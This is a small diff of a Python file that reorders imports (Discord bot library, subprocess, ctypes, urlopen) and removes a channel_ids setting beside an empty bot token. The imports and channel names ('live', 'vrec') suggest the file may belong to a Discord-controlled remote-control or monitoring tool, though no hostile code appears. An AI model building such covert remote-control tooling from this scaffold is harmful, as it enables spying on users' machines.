@@ -1,14 +1,14 @@
 #<imports>
-import os
-import sys
-import json
+from urllib.request import urlopen
+from discord.ext import commands
+from getpass import getuser
+import subprocess
+import discord
 import asyncio
 import ctypes
-import discord
-import subprocess
-from getpass import getuser
-from discord.ext import commands
-from urllib.request import urlopen
+import json
+import sys
+import os
 #</imports>
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
@@ -18,7 +18,6 @@ from urllib.request import urlopen
 #<configuration />
 bot_token = ''
 guild_ids = []
-channel_ids = {'main': True, 'spam': True, 'live': False, 'vrec': False}
 #</configuration>
 DEFAULT = 'DEFAULT'
 
